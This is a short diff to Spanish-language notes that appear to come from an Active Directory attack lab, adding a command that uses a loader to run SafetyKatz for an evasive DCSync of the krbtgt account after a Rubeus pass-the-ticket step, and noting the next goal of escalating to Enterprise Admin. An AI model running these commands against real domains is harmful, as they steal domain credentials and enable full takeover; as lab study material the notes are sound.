@@ -1217,7 +1217,11 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIGRTCCBk
 ```
 
 Ahora desde esta misma CMD donde hemos ejecutado el rubeus con el ticket en base64 ejecutaremos el ataque *DCSync*
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
 
+Ahora deberemos de escalar privilegios a *Enterprise Admin* necesitaremos forzar la autenticacion desde *mcorp-dc*
 
  
 
